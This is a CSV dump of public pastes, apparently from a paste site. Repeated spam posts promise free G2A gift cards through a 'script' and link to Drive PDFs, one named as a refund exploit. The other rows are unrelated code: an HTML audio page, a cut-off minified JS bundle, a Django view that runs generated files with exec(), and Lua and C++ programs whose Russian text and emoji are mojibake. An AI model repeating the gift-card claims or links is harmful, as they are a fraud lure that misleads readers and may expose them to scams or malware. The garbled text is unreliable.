id,title,username,language,date,content
NKghS1tn,ü§ëG2A.com Free Gift Card FIX June 2024ü§ë,Alfonso1119,JavaScript,Friday 28th of June 2024 01:04:37 AM CDT,"G2A.com free gift card & games guide.
Any voucher for free on G2A.com including Amazon gift cards & all else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
June 24 2024

"
7RSKZebL,ü§ëG2A.com Free Gift Card FIX June 2024ü§ë,Garoam,JavaScript,Friday 28th of June 2024 12:58:34 AM CDT,"G2A.com complimentary gift card & games guide.
Any item for free on G2A.com including Steam gift cards & all else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
24th of June 2024

"
NQd3jJR1,ü§ëG2A.com Free Gift Card FIX June 2024üéÅ,atakan1983,JavaScript,Friday 28th of June 2024 12:52:29 AM CDT,"G2A.com complimentary voucher & gaming guide.
Any voucher for free on G2A.com including Steam gift cards & everything else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
June 24 2024

"
jRwqSw3L,ü§ëG2A.com Free Gift Card FIX June 2024ü§ë,tajdiqul,JavaScript,Friday 28th of June 2024 12:46:13 AM CDT,"G2A.com free voucher & games guide.
Any gift card for free on G2A.com including Steam gift cards & everything else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
June 24th 2024

"
PmHDnQ18,üéÅ G2A.COM FREE GIFT CARD GUIDE JUN 2024V4 üéÅ,jusst2k4,GetText,Friday 28th of June 2024 12:40:39 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_476965.pdf
 
Working as of:
28 June 2024"
G1Pvx6Ev,ü§ëG2A.com Free Gift Card FIX June 2024üéÅ,notgoodatscripting,JavaScript,Friday 28th of June 2024 12:39:59 AM CDT,"G2A.com complimentary gift card & gaming guide.
Any voucher for free on G2A.com including Xbox gift cards & anything else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
June 24th 2024

"
xypTUQK9,ü§ëG2A.com Free Gift Card FIX June 2024üéÅ,bgill55,JavaScript,Friday 28th of June 2024 12:33:44 AM CDT,"G2A.com complimentary voucher & gaming guide.
Any voucher for free on G2A.com including Steam gift cards & anything else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
24th of June 2024

"
UbnCL1tP,ü§ëG2A.com Free Gift Card FIX June 2024ü§ë,FreeRobux12345,JavaScript,Friday 28th of June 2024 12:27:40 AM CDT,"G2A.com complimentary voucher & gaming guide.
Any gift card for free on G2A.com including Steam gift cards & all else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
June 24th 2024

"
DT8zDvFA,ü§ëG2A.com Free Gift Card FIX June 2024üéÅ,mikyser,JavaScript,Friday 28th of June 2024 12:21:35 AM CDT,"G2A.com complimentary gift card & games guide.
Any gift card for free on G2A.com including Steam gift cards & all else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
24th of June 2024

"
bf1RWTv9,Audio Fade Out,1xptolevitico69,HTML,Friday 28th of June 2024 12:16:05 AM CDT,"<!DOCTYPE html>
<html lang=""en"">
   <head>
      <meta charset=""UTF-8"" />
      <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"" />
      <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"" />
      <style>


         body {
            margin: 0;
         }

         * {
            box-sizing: border-box;
            font-family: arial black;
         }

         .top {
            width: 100%;
            height: 100vh;
            border: 0;
            outline: 0;
            background-color: white;
         }

         .top a {
            display: block;
            color: red;
            margin: 0 5px;
            text-decoration: none;
            font-weight: 900;
            font-size: 25px;
         }

         .top input {
            display: inline-block;
            margin: 3px;
         }

         h1 {
            margin: 30px 0;
         }

         .search {
            outline: 3px solid red;
            font-size: 20px;
            width: 150px;
            text-align: center;
            border: 2px solid white;
            color: red;
            background-color: red;
            color: white;
         }

         @media (orientation: portrait) and (max-width:425px){
            .top input {
               display: block;
               margin: 9px auto;
            }

            h1 {
               font-size: 20px;
            }
         }

         @media (orientation: landscape) and (max-width: 640px) {
            h1 {
               font-size: 20px;
            }

            .avatar {
               margin: auto;
            }
         }
      </style>
   </head>

   <body>
      <audio id=""audio"" loop src=""https://1xpto.netlify.app/audio/trance.mp3""></audio>

      <button class=""top"">
         <a href=""https://1xpto.netlify.app/"">Home</a>
         <a href=""https://www.facebook.com/ManuelJSAndrade/"">Facebook</a>

         <h1>AUDIO FADE OUT</h1>

         <input class=""search"" onclick=""Style()"" type=""button"" value=""Src Code"" />
         <input class=""search"" onclick=""web()"" type=""button"" value=""HTML"" />
      </button>

      <script>
         function Style() {
            audio.play();
            foo = window.open(""https://1xpto.netlify.app/articles/audio%20fade%20out/local/index.txt"");
         }

         function web() {
            audio.pause();
            window.open(""https://1xpto.netlify.app/articles/audio%20fade%20out/local/"", ""_self"");
            foo.close();
         }
      </script>
   </body>
</html>"
9HaX5X6H,ü§ëG2A.com Free Gift Card FIX June 2024ü§ë,Ohtaku,JavaScript,Friday 28th of June 2024 12:15:31 AM CDT,"G2A.com complimentary voucher & gaming guide.
Any gift card for free on G2A.com including Xbox gift cards & all else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
June 24th 2024

"
UV2Ttb63,Untitled,LissaBeth1978,JavaScript,Friday 28th of June 2024 12:11:26 AM CDT,"/*! For license information please see Bletchley.js.LICENSE.txt */
(()=>{var e={87757:(e,t,r)=>{e.exports=r(35666)},79742:(e,t)=>{""use strict"";t.byteLength=function(e){var t=u(e),r=t[0],n=t[1];return 3*(r+n)/4-n},t.toByteArray=function(e){var t,r,i=u(e),a=i[0],s=i[1],c=new o(function(e,t,r){return 3*(t+r)/4-r}(0,a,s)),l=0,f=s>0?a-4:a;for(r=0;r<f;r+=4)t=n[e.charCodeAt(r)]<<18|n[e.charCodeAt(r+1)]<<12|n[e.charCodeAt(r+2)]<<6|n[e.charCodeAt(r+3)],c[l++]=t>>16&255,c[l++]=t>>8&255,c[l++]=255&t;return 2===s&&(t=n[e.charCodeAt(r)]<<2|n[e.charCodeAt(r+1)]>>4,c[l++]=255&t),1===s&&(t=n[e.charCodeAt(r)]<<10|n[e.charCodeAt(r+1)]<<4|n[e.charCodeAt(r+2)]>>2,c[l++]=t>>8&255,c[l++]=255&t),c},t.fromByteArray=function(e){for(var t,n=e.length,o=n%3,i=[],a=16383,s=0,u=n-o;s<u;s+=a)i.push(c(e,s,s+a>u?u:s+a));return 1===o?(t=e[n-1],i.push(r[t>>2]+r[t<<4&63]+""=="")):2===o&&(t=(e[n-2]<<8)+e[n-1],i.push(r[t>>10]+r[t>>4&63]+r[t<<2&63]+""="")),i.join("""")};for(var r=[],n=[],o=""undefined""!=typeof Uint8Array?Uint8Array:Array,i=""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"",a=0,s=i.length;a<s;++a)r[a]=i[a],n[i.charCodeAt(a)]=a;function u(e){var t=e.length;if(t%4>0)throw new Error(""Invalid string. Length must be a multiple of 4"");var r=e.indexOf(""="");return-1===r&&(r=t),[r,r===t?0:4-r%4]}function c(e,t,n){for(var o,i,a=[],s=t;s<n;s+=3)o=(e[s]<<16&16711680)+(e[s+1]<<8&65280)+(255&e[s+2]),a.push(r[(i=o)>>18&63]+r[i>>12&63]+r[i>>6&63]+r[63&i]);return a.join("""")}n[""-"".charCodeAt(0)]=62,n[""_"".charCodeAt(0)]=63},44431:function(e,t,r){var n;!function(o){""use strict"";var i,a=/^-?(?:\d+(?:\.\d*)?|\.\d+)(?:e[+-]?\d+)?$/i,s=Math.ceil,u=Math.floor,c=""[BigNumber Error] "",l=c+""Number primitive has more than 15 significant digits: "",f=1e14,h=14,p=9007199254740991,d=[1,10,100,1e3,1e4,1e5,1e6,1e7,1e8,1e9,1e10,1e11,1e12,1e13],m=1e7,v=1e9;function y(e){var t=0|e;return e>0||e===t?t:t-1}function g(e){for(var t,r,n=1,o=e.length,i=e[0]+"""";n<o;){for(t=e[n++]+"""",r=h-t.length;r--;t=""0""+t);i+=t}for(o=i.length;48===i.charCodeAt(--o););return i.slice(0,o+1||1)}function b(e,t){var r,n,o=e.c,i=t.c,a=e.s,s=t.s,u=e.e,c=t.e;if(!a||!s)return null;if(r=o&&!o[0],n=i&&!i[0],r||n)return r?n?0:-s:a;if(a!=s)return a;if(r=a<0,n=u==c,!o||!i)return n?0:!o^r?1:-1;if(!n)return u>c^r?1:-1;for(s=(u=o.length)<(c=i.length)?u:c,a=0;a<s;a++)if(o[a]!=i[a])return o[a]>i[a]^r?1:-1;return u==c?0:u>c^r?1:-1}function w(e,t,r,n){if(e<t||e>r||e!==u(e))throw Error(c+(n||""Argument"")+(""number""==typeof e?e<t||e>r?"" out of range: "":"" not an integer: "":"" not a primitive number: "")+String(e))}function x(e){var t=e.c.length-1;return y(e.e/h)==t&&e.c[t]%2!=0}function A(e,t){return(e.length>1?e.charAt(0)+"".""+e.slice(1):e)+(t<0?""e"":""e+"")+t}function B(e,t,r){var n,o;if(t<0){for(o=r+""."";++t;o+=r);e=o+e}else if(++t>(n=e.length)){for(o=r,t-=n;--t;o+=r);e+=o}else t<n&&(e=e.slice(0,t)+"".""+e.slice(t));return e}i=function e(t){var r,n,o,i,E,F,k,S,R,I,T=Z.prototype={constructor:Z,toString:null,valueOf:null}"
zC0aGVKL,Untitled,anushkapandeyyy,Python,Friday 28th of June 2024 12:10:11 AM CDT,"def execute_transformation(req, project):
    print(""Starting transformation execution"")
    project_obj = ProjectSvc.get_by_name(name=project)
    print(f""Retrieved project object: {project_obj}"")
    data_nodes = DataNodeService.get_by_project(project=project_obj)
    print(f""Retrieved data nodes: {data_nodes}"")
    code_version = None

    try:
        code_version = CodeVersion.get_by_project(project).latest('generated_on')
        generated_on = code_version.generated_on
        print(f""Retrieved code version: {code_version}"")
    except Exception as e:
        generated_on = '-'
        print(f""Error retrieving code version: {e}"")

    additionalDetailsColumns = {}
    for dataNodeDetail in data_nodes:
        data_node_alias = dataNodeDetail.alias
        try:
            columnList = [val for val in dataNodeDetail.additional_parameters['schema'].keys()]
        except Exception as e:
            columnList = []
            print(f""Error retrieving additional parameters for data node {data_node_alias}: {e}"")
        additionalDetailsColumns[data_node_alias] = columnList
    print(f""Additional details columns: {additionalDetailsColumns}"")

    response = None

    if req.method == 'POST':
        print(""POST request received"")
        form_identifier = req.POST[""form_identifier""]
        current_parameter = ParameterSvc.get_by_project(project_obj)
        settings = json.loads(current_parameter.get(name='General').data)
        print(f""Settings: {settings}"")

        if form_identifier == ""transformation-form"":
            if 'execute' in req.POST:
                print(""Execution requested"")
                generated_files = CodeVersion.get_code_by_code_version(code_version=code_version)
                run_id = datetime.now().strftime(""XFR-%m%d%y-%H%M%S"")
                businessDate = format_date(req.POST['businessDate'], settings.get('date_format'))
                sys.argv = ["""", run_id, businessDate]

                for i in generated_files:
                    path = f""{django_settings.MEDIA_ROOT}/{i.file}""
                    fp = open(path)
                    print(f""Executing file: {path}"")
                    logger.info(f""EXECUTING : {path}"")

                    try:
                        exec(fp.read())
                    except Exception as e:
                        print(f""Error during file execution: {e}"")
                        logger.exception(f""ERROR: during code execution in file : {__file__}"")
                        logger.exception(f""Error {e}"")
                print(""File execution finished"")
                logger.info(""FILE EXECUTION FINISHED"")
                RunExecutionDetailSvc.save_execution_detail(project=project_obj, run_id=run_id, business_date=businessDate,
                                                            executed_on=datetime.today(),
                                                            run_type=""XFR"")
            else:
                try:
                    print(""Processing transformation flow"")
                    businessDate = format_date(req.POST['businessDate'], settings.get('date_format'))

                    prefix = 'transformation_'
                    transformation_flow = [x[len(prefix):] for x in list(req.POST.keys()) if x.startswith(prefix)]
                    transformation_flows = [x for x in transformation_flow]
                    column_mapping_for_flow = []
                    for item in transformation_flows:
                        column_mapping_for_flow.append(ColumnMappingSvc.get_by_flow_name_and_project(flow_name=item, project=project_obj))
                    transformation_config = []
                    for i in column_mapping_for_flow:
                        transformation_config.append(model_to_dict(i))
                    print(f""Transformation config: {transformation_config}"")

                    parameters = ParametersSvc.get_by_project(project=project_obj, name='General')
                    code_gen_path = loads(parameters.data)[""code_gen_path""]
                    if not code_gen_path:
                        print(""Error: Code Gen Path not found"")
                        logger.exception(""Enter Code Gen Path."")
                        response = {""status"": ""failure"", ""error"": ""Code Gen Path not found""}

                    _temp = []
                    for i in transformation_config:
                        _temp.append(transformation_minimizer(i))
                    print(f""Temp transformation config: {_temp}"")

                    response = None
                    for idx, config_item in enumerate(_temp):
                        config = {
                            'flow': config_item,
                            'parameters': model_to_dict(ParametersSvc.get_by_project(project_obj))
                        }
                        try:
                            transformation(project_obj, code_gen_path, config, businessDate, execute=False)
                        except Exception as e:
                            print(f""Error during transformation: {e}"")
                            logger.exception(f""ERROR: {str(e)}"")
                            response = {""status"": ""failure"", ""error"": str(e)}
                            break
                        else:
                            response = {""status"": ""success""}

                except Exception as e:
                    print(f""Error processing transformation flow: {e}"")
                    logger.exception(f""ERROR: {str(e)}"")
                    response = {""status"": ""failure"", ""error"": str(e)}

    distinct_flows = FlowSvc.get_by_project(project_obj).values('flow_name').distinct()
    print(f""Distinct flows: {distinct_flows}"")

    column_mappings = []
    for flow_info in distinct_flows:
        flow_name = flow_info['flow_name']
        column_mappings.append({
            'flow_name': flow_name,
        })
    print(f""Column mappings: {column_mappings}"")

    context = {
        'column_mappings': column_mappings,
        'project': project,
        'response': response
    }
    print(""Rendering response"")
    return render(req, ""pages/generate-transformation.html"", context)
"
F3nhpnB3,ü§ëG2A.com Free Gift Card FIX June 2024üéÅ,Elii,JavaScript,Friday 28th of June 2024 12:09:16 AM CDT,"G2A.com complimentary voucher & gaming guide.
Any gift card for free on G2A.com including Amazon gift cards & anything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
24th of June 2024

"
syVTQRGg,MoveDirection refactor,Aquakman,C#,Thursday 27th of June 2024 11:55:52 PM CDT,"void MoveToTarget(Vector3 targetPosition)
{
    customTargetPosition = targetPosition;
    targetDir = customTargetPosition - myGameObject.transform.position;
    radvalue = Mathf.Atan2(targetDir.y, targetDir.x);
    AngleTarget = radvalue * (180 / Mathf.PI);
}

void HandleMoveDirections(MoveDirections direction)
{
    switch (direction)
    {
        case MoveDirections.TowardsSpawnXY:
            MoveToTarget(new Vector3(spawnX, spawnY, 0f));
            break;
        case MoveDirections.TowardsPositionXY:
            MoveToTarget(new Vector3(targetPositionXY.x, targetPositionXY.y, 0f));
            break;
        case MoveDirections.TowardsPlayer:
            customTarget = GameManager.get.Player.gameObject;
            MoveToTarget(GameManager.get.Player.GetActorSpot(ActorSpots.HitSpot));
            break;
        case MoveDirections.ActorTarget:
            customTarget = GameManager.get.Player.Target.gameObject;
            MoveToTarget(GameManager.get.Player.GetActorSpot(ActorSpots.HitSpot));
            break;
        case MoveDirections.CustomTarget:
            MoveToTarget(customTarget.transform.position);
            break;
    }
}
"
qgDdfpAt,lamp.lua,crococrystal,Lua,Thursday 27th of June 2024 11:46:47 PM CDT,"local component = require(""component"")
local event = require(""event"")
local term = require(""term"")
local filesystem = require(""filesystem"")
local dkjson = require(""dkjson"")
local colorsFile = ""/colors.json""

local function loadColors()
    if filesystem.exists(colorsFile) then
        local file = io.open(colorsFile, ""r"")
        local data = file:read(""*all"")
        file:close()
        return dkjson.decode(data)
    else
        return {}
    end
end

local function saveColors(colors)
    local data = dkjson.encode(colors, { indent = true })
    local file = io.open(colorsFile, ""w"")
    file:write(data)
    file:close()
end

local favoriteColors = loadColors()
local currentColor = nil

local function setAllLampsColor(color)
    for address in component.list(""colorful_lamp"") do
        component.proxy(address).setLampColor(color)
    end
end

local function displayMenu()
    term.clear()
    print(""–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:"")
    print(""1. –£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Ü–≤–µ—Ç –¥–ª—è –≤—Å–µ—Ö –ª–∞–º–ø"")
    print(""2. –°–æ—Ö—Ä–∞–Ω–∏—Ç—å —Ç–µ–∫—É—â–∏–π —Ü–≤–µ—Ç –≤ –∏–∑–±—Ä–∞–Ω–Ω–æ–µ"")
    print(""3. –ò–∑–±—Ä–∞–Ω–Ω—ã–µ —Ü–≤–µ—Ç–∞"")
    print(""4. –î–∏—Å–∫–æ—Ç–µ–∫–∞"")
    print(""–ù–∞–∂–º–∏—Ç–µ Enter –¥–ª—è –≤—ã—Ö–æ–¥–∞ –∏–∑ –ø—Ä–æ–≥—Ä–∞–º–º—ã"")
end

local function handleColorInput()
    term.clear()
    print(""–í–≤–µ–¥–∏—Ç–µ —Ü–≤–µ—Ç (–æ—Ç 1 –¥–æ 32767). Enter –¥–ª—è –≤—ã—Ö–æ–¥–∞."")
    while true do
        local input = io.read()
        if input == """" then break end
        local color = tonumber(input)
        if color and color >= 1 and color <= 32767 then
            currentColor = color
            setAllLampsColor(color)
            print(""–¶–≤–µ—Ç —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω: "" .. color)
        else
            print(""–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞."")
        end
    end
end

local function saveCurrentColor()
    if currentColor then
        print(""–í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –¥–ª—è —Ü–≤–µ—Ç–∞ "" .. currentColor .. "":"")
        local name = io.read()
        favoriteColors[name] = currentColor
        saveColors(favoriteColors)
        print(""–¶–≤–µ—Ç —Å–æ—Ö—Ä–∞–Ω—ë–Ω –ø–æ–¥ –Ω–∞–∑–≤–∞–Ω–∏–µ–º: "" .. name)
    else
        print(""–ù–µ—Ç —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–≥–æ —Ü–≤–µ—Ç–∞ –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è."")
    end
end

local function listFavoriteColors()
    term.clear()
    local keys = {}
    for name, _ in pairs(favoriteColors) do
        table.insert(keys, name)
    end
    table.sort(keys)
    local i = 1
    for _, name in ipairs(keys) do
        print(i .. "". "" .. name .. "" —Ü–≤–µ—Ç: "" .. favoriteColors[name])
        i = i + 1
    end
    print(""–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ —Ü–≤–µ—Ç–∞. Enter –¥–ª—è –≤—ã—Ö–æ–¥–∞."")
    local input = io.read()
    if input ~= """" then
        local index = tonumber(input)
        if index and index >= 1 and index <= #keys then
            local name = keys[index]
            setAllLampsColor(favoriteColors[name])
            print(""–£—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω —Ü–≤–µ—Ç: "" .. favoriteColors[name] .. "" ("" .. name .. "")"")
        end
    end
end

local function discoMode()
    term.clear()
    print(""–î–∏—Å–∫–æ—Ç–µ–∫–∞ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–∞! –ù–∞–∂–º–∏—Ç–µ Enter –¥–ª—è –≤—ã—Ö–æ–¥–∞."")
    while not event.pull(0.1, ""key_down"") do
        for address in component.list(""colorful_lamp"") do
            local randomColor = math.random(0, 32767)
            component.proxy(address).setLampColor(randomColor)
        end
    end
end

local running = true
while running do
    displayMenu()
    local choice = io.read()
    if choice == ""1"" then
        handleColorInput()
    elseif choice == ""2"" then
        saveCurrentColor()
    elseif choice == ""3"" then
        listFavoriteColors()
    elseif choice == ""4"" then
        discoMode()
    elseif choice == """" then
        running = false
    else
        print(""–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –≤—ã–±–æ—Ä. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞."")
    end
end

print(""–ü—Ä–æ–≥—Ä–∞–º–º–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞."")"
t4rhZSZr,dasha,hpnq,C++,Thursday 27th of June 2024 11:16:29 PM CDT,"#include <iostream>
#include <fstream>
#include <iomanip>
#include <string.h>
#include <windows.h>
using namespace std;

struct Countries {
    string name; //–Ω–∞–∑–≤–∞–Ω–∏–µ —Å—Ç—Ä–∞–Ω—ã
    string capital; //—Å—Ç–æ–ª–∏—Ü–∞
    double population; //—á–∏—Å–ª–µ–Ω–Ω–æ—Å—Ç—å –Ω–∞—Å–µ–ª–µ–Ω–∏—è
    double populationPercent; //–ø—Ä–æ—Ü–µ–Ω—Ç –Ω–∞—Å–µ–ª–µ–Ω–∏—è –æ—Ç –æ–±—â–µ–º–∏—Ä–æ–≤–æ–≥–æ
    double area; //–ø–ª–æ—â–∞–¥—å
};

struct node // –æ–ø–∏—Å–∞–Ω–∏–µ —É–∑–ª–∞ –¥–µ—Ä–µ–≤–∞
{
    Countries countries;// –ø–æ–ª–µ –¥–∞–Ω–Ω—ã—Ö - –ø–µ—Ä–µ–º–µ–Ω–Ω–∞—è —Ç–∏–ø–∞ —Å—Ç—Ä–∞–Ω–∞
    node* left, * right; // —É–∫–∞–∑–∞—Ç–µ–ª–∏ –Ω–∞ –ª–µ–≤–æ–µ –∏ –ø—Ä–∞–≤–æ–µ –ø–æ–¥–¥–µ—Ä–µ–≤—å—è
};



void inputstudent(Countries& countries)//–≤–≤–æ–¥ –¥–∞–Ω–Ω—ã—Ö –æ —Å—Ç—É–¥–µ–Ω—Ç–µ
{
    cout << ""–í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ —Å—Ç—Ä–∞–Ω—ã: "" << endl;
    cin >> countries.name;
    cout << ""–í–≤–µ–¥–∏—Ç–µ —Å—Ç–æ–ª–∏—Ü—É:"" << endl;
    cin >> countries.capital;
    cout << ""–í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–µ–Ω–Ω–æ—Å—Ç—å –Ω–∞—Å–µ–ª–µ–Ω–∏—è:"" << endl;
    cin >> countries.population;
    cout << ""–í–≤–µ–¥–∏—Ç–µ –ø—Ä–æ—Ü–µ–Ω—Ç –Ω–∞—Å–µ–ª–µ–Ω–∏—è –æ—Ç –æ–±—â–µ–º–∏—Ä–æ–≤–æ–≥–æ:"" << endl;
    cin >> countries.populationPercent;
    cout << ""–í–≤–µ–¥–∏—Ç–µ –ø–ª–æ—â–∞–¥—å:"" << endl;
    cin >> countries.area;

}


//–≤–≤–æ–¥ –º–∞—Å—Å–∏–≤–∞ —Å –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã
void inputMasFromKeyboard(Countries*& mas, unsigned int& size)
{
    cout << ""–í–≤–µ–¥–∏—Ç–µ —Ä–∞–∑–º–µ—Ä –º–∞—Å—Å–∏–≤–∞"" << endl;
    cin >> size;
    if (size == 0) return;//–µ—Å–ª–∏ —Ä–∞–∑–º–µ—Ä=0, —Ç–æ –≤—ã—Ö–æ–¥–∏–º –∏–∑ —Ñ—É–Ω–∫—Ü–∏–∏
    mas = new Countries[size];//—Å–æ–∑–¥–∞–µ–º –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏–π –º–∞—Å—Å–∏–≤
    int i;//–∏–Ω–¥–µ–∫—Å —ç–ª–µ–º–µ–Ω—Ç–∞ –º–∞—Å—Å–∏–≤–∞
    for (i = 0; i < size; i++)
    {
        cout << ""–í–≤–µ–¥–∏—Ç–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å—Ç—Ä–∞–Ω–µ:"" << endl;
        inputstudent(mas[i]);
    }
}

void printStudent(Countries countries)//–ø–µ—á–∞—Ç—å –¥–∞–Ω–Ω—ã—Ö –æ —Å—Ç—É–¥–µ–Ω—Ç–µ
{
    cout << left << setw(10) << countries.name << setw(15) << countries.capital << setw(10) << countries.population << setw(9)
         << countries.populationPercent << setw(5) << countries.area  << endl;;

}

void printMas(Countries* mas, unsigned int size)
{
    if (!size) return;
    cout << ""–°–æ–∑–¥–∞–Ω–Ω—ã–π –º–∞—Å—Å–∏–≤ —Å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–µ–π –æ —Å—Ç—Ä–∞–Ω–∞—Ö:"" << endl;
    cout << left << setw(10) << ""–ù–∞–∑–≤–∞–Ω–∏–µ"" << setw(15) << ""–°—Ç–æ–ª–∏—Ü–∞"" << setw(10) << ""–ß–∏—Å–ª.–Ω–∞—Å–µ–ª–µ–Ω–∏—è"" << setw(9)
         << ""–ü—Ä–æ—Ü–µ–Ω—Ç –Ω–∞—Å–µ–ª–µ–Ω–∏—è"" << setw(5) << ""–ü–ª–æ—â–∞–¥—å"" << endl;
    for (int i = 0; i < size; i++)
    {
        printStudent(mas[i]);
    }
}


void insert(node** p, Countries countries) // –¥–æ–±–∞–≤–ª–µ–Ω–∏–µ —É–∑–ª–∞ –≤ –¥–µ—Ä–µ–≤–æ –ø–æ–∏—Å–∫–∞
{
    if (*p == NULL)//–∏–ª–∏ (!*p) //–Ω–∞—à–ª–∏ –ø—É—Å—Ç–æ–π —É–∫–∞–∑–∞—Ç–µ–ª—å ‚Äì –ø—É—Å—Ç–æ–µ –º–µ—Å—Ç–æ
    { //—Å–æ–∑–¥–∞—ë–º –Ω–æ–≤—ã–π —É–∑–µ–ª –¥–µ—Ä–µ–≤–∞ –Ω–∞ –Ω–∞–π–¥–µ–Ω–Ω–æ–º –º–µ—Å—Ç–µ
        *p = new node;
        (*p)->countries = countries;
        (*p)->left = NULL;
        (*p)->right = NULL;
    }
    else
    { //–µ—Å–ª–∏ —Ç–µ–∫—É—â–∏–π —É–∑–µ–ª –Ω–µ –ø—É—Å—Ç
        if (countries.name < (*p)->countries.name) insert(&(*p)->left, countries); //–∏–¥—ë–º –≤ –ª–µ–≤–æ–µ –ø–æ–¥–¥–µ—Ä–µ–≤–æ
        if (countries.name > (*p)->countries.name) insert(&(*p)->right, countries); //–∏–¥—ë–º –≤ –ø—Ä–∞–≤–æ–µ –ø–æ–¥–¥–µ—Ä–µ–≤–æ
        //–æ–¥–∏–Ω–∞–∫–æ–≤—ã–µ –∑–Ω–∞—á–µ–Ω–∏—è –Ω–µ –¥–æ–±–∞–≤–ª—è–µ–º!
    }
}

// —Ä–∞—Å–ø–µ—á–∞—Ç–∫–∞ –¥–µ—Ä–µ–≤–∞ –≤ —Å–∏–º–º–µ—Ç—Ä–∏—á–Ω–æ–º –ø–æ—Ä—è–¥–∫–µ
void printsim(const node* p)
{
    if (p != NULL) // –µ—Å–ª–∏ –¥–µ—Ä–µ–≤–æ –Ω–µ –ø—É—Å—Ç–æ
    {
        printsim(p->left); // –ø–µ—á–∞—Ç–∞–µ–º –ª–µ–≤–æ–µ –ø–æ–¥–¥–µ—Ä–µ–≤–æ
        printStudent(p->countries); // –ø–µ—á–∞—Ç–∞–µ–º –∑–Ω–∞—á–µ–Ω–∏–µ –ø–æ–ª—è - –≤—Å—é —Å—Ç—Ä—É–∫—Ç—É—Ä—É —Ç–∏–ø–∞ tstudent
        printsim(p->right); // –ø–µ—á–∞—Ç–∞–µ–º –ø—Ä–∞–≤–æ–µ –ø–æ–¥–¥–µ—Ä–µ–≤–æ
    }
}


void clear(node** p) // –æ—á–∏—Å—Ç–∫–∞ –¥–µ—Ä–µ–≤–∞
{
    if ((*p) != NULL) // –µ—Å–ª–∏ –¥–µ—Ä–µ–≤–æ –Ω–µ –ø—É—Å—Ç–æ
    {
        clear(&(*p)->left); // —É–¥–∞–ª—è–µ–º –ª–µ–≤–æ–µ –ø–æ–¥–¥–µ—Ä–µ–≤–æ
        clear(&(*p)->right); // —É–¥–∞–ª—è–µ–º –ø—Ä–∞–≤–æ–µ –ø–æ–¥–¥–µ—Ä–µ–≤–æ
        delete* p; //–£–¥–∞–ª—è–µ–º —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ —Ç–µ–∫—É—â–∏–π —É–∑–µ–ª
        *p = NULL;//–ü—Ä–∏—Å–≤–∞–∏–≤–∞–µ–º –µ–º—É –ø—É—Å—Ç–æ–π —É–∫–∞–∑–∞—Ç–µ–ª—å
    }
}


//—Ñ—É–Ω–∫—Ü–∏—è —Å–æ–∑–¥–∞–Ω–∏—è –¥–µ—Ä–µ–≤—å–µ–≤ –∏–∑ –º–∞—Å—Å–∏–≤–∞
void createTrees(Countries* mas, unsigned int size, node** root1, node** root2)
{
    if (!size) return;
    for (int i = 0; i < size; i++)
    {
        if (mas[i].population > 100) insert(root1, mas[i]); // –î–æ–±–∞–≤–ª—è–µ–º –Ω–æ–≤—ã–π —É–∑–µ–ª –≤ –ø–µ—Ä–≤–æ–µ –¥–µ—Ä–µ–≤–æ –ø–æ–∏—Å–∫–∞
